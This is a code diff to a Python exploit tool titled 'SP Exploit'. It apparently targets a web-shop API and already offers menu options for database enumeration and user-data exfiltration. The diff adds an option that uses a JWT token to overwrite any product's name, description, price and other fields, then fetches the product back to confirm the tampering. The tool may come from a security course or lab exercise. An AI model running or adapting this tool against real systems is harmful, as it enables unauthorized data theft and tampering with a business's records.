@@ -91,11 +91,35 @@ def enumeration(option):
     result = requests.post(f'{WebsiteIP}/product/{product}/review/', headers={'Content-Type': 'application/json','authorization':jwt_token}, json=payload_json)
     return result.json()
 
+def modify_product(product_id,product_name,product_description,product_categoryid,product_brand,product_price):
+
+    payload_json = {
+        "name" : product_name,
+        "description": product_description,
+        "categoryid": product_categoryid,
+        "brand": product_brand,
+        "price": product_price
+    }
+
+    result = requests.put(f'{WebsiteIP}/product/{product_id}', headers={'Content-Type': 'application/json','authorization':jwt_token}, json=payload_json)
+    return result.json()
+
+def get_products():
+
+    result = requests.get(f'{WebsiteIP}/product', headers={'Content-Type': 'application/json','authorization':jwt_token})
+    return result.json()
+
+def find_product_by_id(products, product_id):
+    for product in products:
+        if product['productid'] == product_id:
+            return product
+    return None
+
 def main():
     ascii_logo()
     while True:
         #bad coding but :< the library im using only allows color printed txt on print() function D:
-        print("SP Exploit - By Sora / Jun Yu\n[1] Enumeration\n[2] UserData Exfiltration\n[3] Exit",tag="Info" , tag_color="cyan",color="white")
+        print("SP Exploit - By Sora / Jun Yu\n[1] Enumeration\n[2] UserData Exfiltration\n[3] Modifying Product Details\n[4] Exit",tag="Info" , tag_color="cyan",color="white")
         menu_option = int(input(">>> "))
         if menu_option == 1:
             submenu_option = int(input(" -- Enumeration -- \n[1] MYSQL DB Version\n[2] Current User Account\n[3] Current Database\n>>> "))
@@ -146,7 +170,26 @@ def main():
                 print("Exploit Failed! - Check Options / Is the target actually vulnerable?",tag='Failure', tag_color='red', color='white')
             else:
                 print("Exploit Complete!",tag='Success', tag_color='green', color='white')
+
+                
         elif menu_option == 3:
+            product_id = int(input("Enter the Product ID you wish to edit : "))
+            product_name = str(input("Enter new Product Name : "))
+            product_description = str(input("Enter new Product Description : "))
+            product_categoryid = int(input("Enter new Product categoryid : "))
+            product_brand = str(input("Enter new Product brand : "))
+            product_price = float(input("Enter new Product price : "))
+            result = modify_product(product_id,product_name,product_description,product_categoryid,product_brand,product_price)
+            try:
+                if result['affectedRows'] == 1:
+                    print(result,color="yellow",tag_color="green",tag="Success")
+            except:
+                print(result,color="yellow",tag_color="red",tag="Failure")
+            print("Searching for Affected Product...",color="white",tag_color="green",tag="Success")
+            products = get_products()
+            found_product = find_product_by_id(products, product_id)
+            print(f"-- Retrieved info successfully --\nProductid : {found_product['productid']}\nName : {found_product['name']}\nDescription : {found_product['description']}\nCategoryid : {found_product['categoryid']}\nCategoryname : {found_product['categoryname']}\nBrand : {found_product['brand']}\nPrice : {found_product['price']}\nReviewCount : {found_product['reviewcount']}\nImagePath : {found_product['imagepath']}\nRating : {found_product['rating']}\nDiscountID : {found_product['discountid']}\nDiscount Percentage : {found_product['discount_percentage']}",color="yellow",tag_color="green",tag="Success")
+        elif menu_option == 4:
             break
 
 def ascii_logo():  
